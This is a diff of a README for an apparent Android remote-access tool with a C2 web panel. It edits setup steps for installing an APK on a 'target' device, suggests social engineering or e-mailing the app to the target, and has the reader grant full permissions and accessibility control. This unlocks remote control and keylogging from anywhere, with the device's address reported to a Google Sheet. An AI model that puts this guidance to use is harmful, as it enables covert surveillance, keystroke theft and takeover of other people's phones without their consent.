@@ -105,12 +105,11 @@ During security research, a **critical behavior** in modern Android networking w
 
 > Info - *If you have access to the device, turn on USB debugging (developer settings), plug it into a PC and run `adb install signed.apk`. Otherwise get creative on how to install Android `.apk` files onto devices.(Social Engineering?, E-mailing to Target?, Hosting App on Website/Server?)*
 
-2.  Once the app
-3.   is installed onto the **Target/Test Device**, **ALL permissions must be granted on device**, then tap the **"Initialize Server"** button.
-4.  The **Server** will go online and the **Active interface Web IP Link** should **pop up instantly** on your **Google Sheet**. *(Example Google Sheet Below)*
-5.  **Thats it**! Now you can use **ALL the remote features from anywhere in the world** as long as the **App Server is running on the Target/Test device**.
+2.  Once the app is installed onto the **Target/Test Device**, **ALL permissions must be granted on device**, then tap the **"Initialize Server"** button.
+3.  The **Server** will go online and the **Active interface Web IP Link** should **pop up instantly** on your **Google Sheet**. *(Example Google Sheet Below)*
+4.  **Thats it**! Now you can use **ALL the remote features from anywhere in the world** as long as the **App Server is running on the Target/Test device**.
 
-> Info - *To use the Ghost features you must navigate to the Ghost Tab in the Web Control(C2) Panel and click the "Open Accessibility Settings" button. This opens a page on the device, tap "Installed Apps" and grant access to full control of device. - Images Below)*
+> Info - *To use the Ghost features you must navigate to the "Ghost Tab" in the Web Control(C2) Panel and click the "Open Accessibility Settings" button. This opens a page on the device, tap "Installed Apps" and grant access to full control of device. - Images Below* ** *(This only applies to the "Ghost Remote Control", "Ghost Utilities" and the "Ghost Keylogs" any other features can be used without this permission)*
     
 [![Accessibilities-Perm.png](https://i.postimg.cc/Z510fCkq/Accessibilities-Perm.png)](https://postimg.cc/CRsF5Mxy)
 
